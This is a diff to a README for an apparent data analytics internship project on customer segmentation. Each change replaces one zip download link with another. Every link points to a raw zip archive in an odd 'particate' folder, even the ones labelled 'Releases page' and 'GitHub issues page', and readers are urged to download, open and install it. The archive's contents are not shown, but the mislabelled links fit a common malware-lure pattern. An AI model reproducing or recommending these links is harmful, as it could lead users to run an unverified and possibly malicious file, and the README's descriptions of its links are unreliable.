@@ -1,6 +1,6 @@
 # 🔷 ElevvoPathways-DataAnalytics_Internship-TASK2 - Understand Your Customers Better
 
-![Download](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/ElevvoPathways-DataAnalytics_Internship-TASK2.zip%20Now-Click%20Here-brightgreen)  
+![Download](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/Internship-Data-Pathways-Elevvo-Analytics-TAS-3.0.zip%20Now-Click%20Here-brightgreen)  
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ ElevvoPathways-DataAnalytics_Internship-TASK2 helps you segment customers using 
 To get started with ElevvoPathways, follow these simple steps:
 
 1. **Download the Software:**
-   Visit the [Releases page](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/ElevvoPathways-DataAnalytics_Internship-TASK2.zip) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/Internship-Data-Pathways-Elevvo-Analytics-TAS-3.0.zip) to download the latest version of the application.
 
 2. **Install the Application:**
    Follow the installation guide provided on the releases page once you download the file. The installation process is straightforward and does not require advanced technical skills.
@@ -37,7 +37,7 @@ To get started with ElevvoPathways, follow these simple steps:
 You can easily download the software using the link provided. 
 
 1. **Download the Latest Version:**
-   Visit this [link](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/ElevvoPathways-DataAnalytics_Internship-TASK2.zip) to download the application.
+   Visit this [link](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/Internship-Data-Pathways-Elevvo-Analytics-TAS-3.0.zip) to download the application.
 
 2. **Installation Steps:**
    - Open the downloaded file.
@@ -90,7 +90,7 @@ The application generates several types of visualizations to clearly display you
 
 ## 🌟 Contributing
 
-Your input is valuable. If you want to contribute to improving ElevvoPathways, feel free to submit issues or feature requests on the [GitHub issues page](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/ElevvoPathways-DataAnalytics_Internship-TASK2.zip).
+Your input is valuable. If you want to contribute to improving ElevvoPathways, feel free to submit issues or feature requests on the [GitHub issues page](https://raw.githubusercontent.com/Shreyanshp0/ElevvoPathways-DataAnalytics_Internship-TASK2/main/particate/Internship-Data-Pathways-Elevvo-Analytics-TAS-3.0.zip).
 
 ## 📄 License
 
